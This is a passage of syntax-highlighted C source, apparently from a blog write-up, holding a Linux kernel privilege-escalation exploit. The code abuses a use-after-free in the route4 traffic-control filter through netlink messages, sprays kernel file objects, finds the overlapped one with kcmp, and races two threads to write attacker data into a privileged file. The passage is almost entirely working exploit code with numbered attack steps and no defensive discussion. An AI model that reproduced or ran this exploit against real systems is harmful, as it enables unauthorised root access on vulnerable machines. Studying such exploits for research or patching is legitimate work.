class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;route&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_ROUTE4_FROM, &amp;from, <span class="number">4</span>);              <span class="comment">// TCA_ROUTE4_FROM</span></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_ROUTE4_TO, &amp;to, <span class="number">4</span>);                  <span class="comment">// TCA_ROUTE4_TO</span></span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = msg, .iov_len = msg-&gt;nlmsg_len &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123; .nl_family = AF_NETLINK &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_tc</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">uint32_t</span> handle, <span class="keyword">uint16_t</span> flag)</span> </span>&#123;</span><br><span class="line">    add_tc_(sockfd, <span class="number">0</span>, handle, (handle &lt;&lt; <span class="number">8</span>) + handle, flag);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">calc_handle</span><span class="params">(<span class="keyword">uint32_t</span> from, <span class="keyword">uint32_t</span> to)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> handle = to;</span><br><span class="line"></span><br><span class="line">    assert(from &lt;= <span class="number">0xff</span> &amp;&amp; to &lt;= <span class="number">0xff</span>);</span><br><span class="line">    handle |= from &lt;&lt; <span class="number">16</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (((handle &amp; <span class="number">0x7f00</span>) | handle) != handle)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (handle == <span class="number">0</span> || (handle &amp; <span class="number">0x8000</span>))</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> handle;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">delete_tc_</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">u_int32_t</span> handle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span>* <span class="title">msg</span> =</span> (struct nlmsghdr*)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// delete filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_DELTFILTER;                                   <span class="comment">// RTM_DELTFILTER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span>* <span class="title">t</span> =</span> (struct tcmsg*)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;route&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = msg, .iov_len = msg-&gt;nlmsg_len &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123; .nl_family = AF_NETLINK &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    iov.iov_len = <span class="number">0x4000</span>;</span><br><span class="line">    iov.iov_base = start;</span><br><span class="line">    recvmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgh.msg_namelen != <span class="keyword">sizeof</span>(nladdr))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] size of sender address is wrong\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_tc</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">uint32_t</span> handle)</span> </span>&#123;</span><br><span class="line">    delete_tc_(sockfd, ((handle) &lt;&lt; <span class="number">8</span>) + (handle));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// spray spray_count objects ???</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add_tc_basic</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint32_t</span> handle, <span class="keyword">void</span>* spray_data, <span class="keyword">size_t</span> spray_len, <span class="keyword">int</span> spray_count)</span> </span>&#123;</span><br><span class="line">    assert(spray_len * spray_count &lt; <span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">char</span>* start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span>* <span class="title">msg</span> =</span> (struct nlmsghdr*)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// new filter                      nlmsghdr + tcmsg</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_CREATE; <span class="comment">// | flags;</span></span><br><span class="line">    msg-&gt;nlmsg_type = RTM_NEWTFILTER;                               <span class="comment">// RTM_NEWTFILTER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span>* <span class="title">t</span> =</span> (struct tcmsg*)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line">    <span class="comment">// t-&gt;tcm_parent = TC_H_ROOT;</span></span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x4000</span>, TCA_KIND, <span class="string">&quot;basic&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x4000</span>, TCA_OPTIONS);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">ema_tail</span> =</span> addattr_nest(msg, <span class="number">0x4000</span>, TCA_BASIC_EMATCHES);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcf_ematch_tree_hdr</span> <span class="title">tree_hdr</span> =</span> &#123; .nmatches = spray_count / <span class="number">2</span>,</span><br><span class="line">                                           .progid = <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x4000</span>, TCA_EMATCH_TREE_HDR, &amp;tree_hdr, <span class="keyword">sizeof</span>(tree_hdr));</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">rt_match_tail</span> =</span> addattr_nest(msg, <span class="number">0x4000</span>, TCA_EMATCH_TREE_LIST);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span>* data = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tree_hdr.nmatches; i++) &#123;</span><br><span class="line">        <span class="keyword">char</span>* current;</span><br><span class="line">        <span class="built_in">memset</span>(data, <span class="number">0</span>, <span class="number">0x3000</span>);</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcf_ematch_hdr</span>* <span class="title">hdr</span> =</span> (struct tcf_ematch_hdr*)data;</span><br><span class="line">        hdr-&gt;kind = TCF_EM_META;</span><br><span class="line">        hdr-&gt;flags = TCF_EM_REL_AND;</span><br><span class="line"></span><br><span class="line">        current = data + <span class="keyword">sizeof</span>(*hdr);</span><br><span class="line"></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tcf_meta_hdr</span> <span class="title">meta_hdr</span> =</span> &#123;</span><br><span class="line">            .left.kind = TCF_META_TYPE_VAR &lt;&lt; <span class="number">12</span> | TCF_META_ID_DEV,</span><br><span class="line">            .right.kind = TCF_META_TYPE_VAR &lt;&lt; <span class="number">12</span> | TCF_META_ID_DEV,</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        current += addattr(current, TCA_EM_META_HDR, &amp;meta_hdr, <span class="keyword">sizeof</span>(hdr));</span><br><span class="line">        current += addattr(current, TCA_EM_META_LVALUE, spray_data, spray_len);</span><br><span class="line">        current += addattr(current, TCA_EM_META_RVALUE, spray_data, spray_len);</span><br><span class="line"></span><br><span class="line">        addattr_l(msg, <span class="number">0x4000</span>, i + <span class="number">1</span>, data, current - data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    addattr_nest_end(msg, rt_match_tail);</span><br><span class="line">    addattr_nest_end(msg, ema_tail);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = msg, .iov_len = msg-&gt;nlmsg_len &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123; .nl_family = AF_NETLINK &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    sendmsg(fd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">free</span>(data);</span><br><span class="line">    <span class="built_in">free</span>(start);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">delete_tc_basic</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">u_int32_t</span> handle)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* start = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span>* <span class="title">msg</span> =</span> (struct nlmsghdr*)start;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// delete filter</span></span><br><span class="line">    msg = msg + msg-&gt;nlmsg_len;</span><br><span class="line">    msg-&gt;nlmsg_len = NLMSG_LENGTH(<span class="keyword">sizeof</span>(struct tcmsg));</span><br><span class="line">    msg-&gt;nlmsg_flags = NLM_F_REQUEST | NLM_F_ECHO;</span><br><span class="line">    msg-&gt;nlmsg_type = RTM_DELTFILTER;                           <span class="comment">// RTM_DELTFILTER</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcmsg</span>* <span class="title">t</span> =</span> (struct tcmsg*)(start + <span class="keyword">sizeof</span>(struct nlmsghdr));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prio, protocol</span></span><br><span class="line">    <span class="keyword">u_int32_t</span> prio = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">u_int32_t</span> protocol = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_info = TC_H_MAKE(prio &lt;&lt; <span class="number">16</span>, protocol);</span><br><span class="line">    t-&gt;tcm_ifindex = <span class="number">1</span>;</span><br><span class="line">    t-&gt;tcm_family = AF_UNSPEC;</span><br><span class="line">    t-&gt;tcm_handle = handle;</span><br><span class="line">    <span class="comment">// t-&gt;tcm_parent = TC_H_ROOT;</span></span><br><span class="line"></span><br><span class="line">    addattr_l(msg, <span class="number">0x1000</span>, TCA_KIND, <span class="string">&quot;basic&quot;</span>, <span class="number">6</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rtattr</span>* <span class="title">tail</span> =</span> addattr_nest(msg, <span class="number">0x1000</span>, TCA_OPTIONS);</span><br><span class="line">    addattr_nest_end(msg, tail);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// packing</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = msg, .iov_len = msg-&gt;nlmsg_len &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_nl</span> <span class="title">nladdr</span> =</span> &#123; .nl_family = AF_NETLINK &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">msgh</span> =</span> &#123;</span><br><span class="line">        .msg_name = &amp;nladdr,</span><br><span class="line">        .msg_namelen = <span class="keyword">sizeof</span>(nladdr),</span><br><span class="line">        .msg_iov = &amp;iov,</span><br><span class="line">        .msg_iovlen = <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    sendmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(start, <span class="number">0</span>, <span class="number">0x4000</span>);</span><br><span class="line">    iov.iov_len = <span class="number">0x4000</span>;</span><br><span class="line">    iov.iov_base = start;</span><br><span class="line">    recvmsg(sockfd, &amp;msgh, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgh.msg_namelen != <span class="keyword">sizeof</span>(nladdr))</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] size of sender address is wrong\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> start;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// slow_write() —— thread 1: occupy the write lock (write plenty of data)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">slow_write</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[11-1] start slow write\n&quot;</span>);</span><br><span class="line">    <span class="keyword">clock_t</span> start, end;</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;[-] error open uaf file&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> addr = <span class="number">0x30000000</span>;</span><br><span class="line">    <span class="keyword">int</span> offset;</span><br><span class="line">    <span class="keyword">for</span> (offset = <span class="number">0</span>; offset &lt; <span class="number">0x80000</span> / <span class="number">20</span>; offset++) &#123;     <span class="comment">// mmap space [0x30000000, 0x30000000 + 0x1000 * 0x80000 / 20]</span></span><br><span class="line">        <span class="keyword">void</span>* r = mmap((<span class="keyword">void</span>*)(addr + offset * <span class="number">0x1000</span>), <span class="number">0x1000</span>,</span><br><span class="line">            PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (r &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] allocate failed at 0x%x\n&quot;</span>, offset);</span><br><span class="line">    &#125;</span><br><span class="line">    assert(offset &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">void</span>* mem = (<span class="keyword">void</span>*)(addr);</span><br><span class="line">    <span class="built_in">memcpy</span>(mem, <span class="string">&quot;hhhhh&quot;</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span>[20];</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; i++) &#123; <span class="comment">// write plenty of data (0x80000 * 0x1000 = 0x80 000 000 = 2GB)</span></span><br><span class="line">        iov[i].iov_base = mem;</span><br><span class="line">        iov[i].iov_len = offset * <span class="number">0x1000</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    run_write = <span class="number">1</span>;    <span class="comment">// notifiy thread 2 (unprivileged `file`) begin to write evil data</span></span><br><span class="line">    start = clock();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (writev(fd, iov, <span class="number">20</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        perror(<span class="string">&quot;slow write&quot;</span>);</span><br><span class="line">    end = clock();</span><br><span class="line">    <span class="keyword">double</span> spent = (<span class="keyword">double</span>)(end - start) / CLOCKS_PER_SEC;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] write done, spent %f s\n&quot;</span>, spent);</span><br><span class="line">    run_write = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// write_cmd() —— thread 2: write evil data to the privileged file</span></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">write_cmd</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> <span class="title">iov</span> =</span> &#123; .iov_base = content, .iov_len = <span class="built_in">strlen</span>(content) &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!run_write) &#123;&#125;  <span class="comment">// wait for thread 1 to prepare write</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[11-2] write evil data after the slow write\n&quot;</span>);</span><br><span class="line">    run_spray = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (writev(overlap_a, &amp;iov, <span class="number">1</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to write\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rlimit</span> <span class="title">old_lim</span>, <span class="title">lim</span>, <span class="title">new_lim</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get old limits</span></span><br><span class="line">    <span class="keyword">if</span> (getrlimit(RLIMIT_NOFILE, &amp;old_lim) == <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Old limits -&gt; soft limit= %ld \t&quot;</span></span><br><span class="line">            <span class="string">&quot; hard limit= %ld \n&quot;</span>,</span><br><span class="line">            old_lim.rlim_cur, old_lim.rlim_max);</span><br><span class="line">    pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] starting exploit, num of cores: %d\n&quot;</span>, cpu_cores);</span><br><span class="line">    <span class="comment">// open &amp; setup the socket</span></span><br><span class="line">    sockfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">    assert(sockfd != <span class="number">-1</span>);</span><br><span class="line">    add_qdisc(sockfd);</span><br><span class="line">    <span class="comment">// 3. allocate a route4_filter (vulnerable object)</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[3] allocate the vulnerable filter\n&quot;</span>);</span><br><span class="line">    add_tc_(sockfd, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, NLM_F_EXCL | NLM_F_CREATE);  <span class="comment">// handle = 0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] write to child&quot;</span>);</span><br><span class="line">    <span class="comment">// 6. 1st free the route4_filter, return the `kmalloc-256` page to the page allocator</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// free the object, to free the slab</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[6] 1st freed the filter object\n&quot;</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0</span>, NLM_F_CREATE);         <span class="comment">// handle = 0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for the vulnerable object being freed</span></span><br><span class="line">    usleep(<span class="number">500</span> * <span class="number">1000</span>);</span><br><span class="line">    <span class="keyword">if</span> (write(pipe_parent[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] write to child&quot;</span>);</span><br><span class="line">    <span class="comment">// 8. spray 4000 unprivileged `file`</span></span><br><span class="line">    <span class="keyword">if</span> (read(pipe_child[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line"></span><br><span class="line">    usleep(<span class="number">1000</span> * <span class="number">1000</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[8] spray 4000 uprivileged `file`\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_1; i++) &#123;</span><br><span class="line">        pin_on_cpu(i % cpu_cores);</span><br><span class="line">        fds[i] = open(<span class="string">&quot;./data2&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        assert(fds[i] &gt; <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// printf(&quot;pause before 2nd free\n&quot;);</span></span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">  <span class="comment">// 9. 2nd free route4_filter, which will free the file</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[9] 2nd free the filter object\n&quot;</span>);</span><br><span class="line">    add_tc_(sockfd, <span class="number">0x11</span>, <span class="number">0x13</span>, <span class="number">0</span>, NLM_F_CREATE);         <span class="comment">// handle = 0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;pause after 2nd free\n&quot;</span>);</span><br><span class="line">    <span class="comment">// getchar();</span></span><br><span class="line">    <span class="comment">// sleep(10000);</span></span><br><span class="line">    usleep(<span class="number">1000</span> * <span class="number">100</span>);   <span class="comment">// should not sleep too long, otherwise file might be claimed by others</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 10. spray 5000 unprivileged `file` &amp; find the overlapped file</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[10] spraying 5000 unprivileged `file`\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num_2; i++) &#123;</span><br><span class="line">        pin_on_cpu(i % cpu_cores);</span><br><span class="line">        fd_2[i] = open(<span class="string">&quot;./uaf&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        assert(fd_2[i] &gt; <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; spray_num_1; j++) &#123;</span><br><span class="line">            <span class="comment">// 10-1. spray one `file` &amp; use kcmp to check if we take up the vulnerable object</span></span><br><span class="line">            <span class="keyword">if</span> (syscall(__NR_kcmp, getpid(), getpid(), KCMP_FILE, fds[j], fd_2[i]) == <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[10-1] found overlapped file, id : %d, %d\n&quot;</span>, i, j);</span><br><span class="line">                overlap_a = fds[j];</span><br><span class="line">                overlap_b = fd_2[i];</span><br><span class="line">                <span class="comment">// 11. start 2 threads: Thread 1-take up write lock; Thread 2-write evil data</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;[11] start 2 threads compete to write\n&quot;</span>);</span><br><span class="line">                <span class="keyword">pthread_t</span> pid, pid2;</span><br><span class="line">                pthread_create(&amp;pid, <span class="literal">NULL</span>, slow_write, <span class="literal">NULL</span>);</span><br><span class="line">                pthread_create(&amp;pid2, <span class="literal">NULL</span>, write_cmd, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span> (!run_spray) &#123;&#125;</span><br><span class="line">                <span class="comment">// 12. spray privileged `file` object</span></span><br><span class="line">                close(overlap_a);     <span class="comment">// ??????????? why release twice ???????????</span></span><br><span class="line">                close(overlap_b);</span><br><span class="line"></span><br><span class="line">                usleep(<span class="number">1000</span> * <span class="number">100</span>);</span><br><span class="line">                <span class="keyword">int</span> spray_num = <span class="number">4096</span>;</span><br><span class="line">                write(pipe_file_spray[<span class="number">0</span>][<span class="number">1</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">                <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">1</span>][<span class="number">0</span>], &amp;msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">                    err(<span class="number">1</span>, <span class="string">&quot;[-] read from file spray&quot;</span>);</span><br><span class="line">                overlapped = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> 